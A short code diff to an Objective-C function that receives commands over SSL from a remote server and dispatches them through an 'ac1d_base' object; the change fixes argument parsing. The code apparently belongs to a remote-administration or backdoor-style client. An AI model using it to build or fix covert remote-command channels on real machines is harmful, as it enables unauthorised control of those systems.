@@ -47,7 +47,7 @@ void interactWithServer(NSString *remoteHost, int remotePort) {
     
     char buffer[2048] = "";
     while (SSL_read(client_ssl, buffer, sizeof(buffer))) {
-        NSMutableArray *args = [NSMutableArray arrayWithArray:[buffer componentsSeparatedByString:@" "]];
+        NSMutableArray *args = [NSMutableArray arrayWithArray:[[NSString stringWithUTF8String:buffer] componentsSeparatedByString:@" "]];
         ac1d_base->terminator = (char*)[args[0] UTF8String];
         
         // 0 - terminator
@@ -58,7 +58,7 @@ void interactWithServer(NSString *remoteHost, int remotePort) {
             NSLog(@"%@", string);
         }
         
-        if ([commands containsObject:cmd]) [ac1d_base send_command:args];
+        if ([commands containsObject:args[1]]) [ac1d_base send_command:args];
         memset(buffer, '\0', 2048);
     }
 }
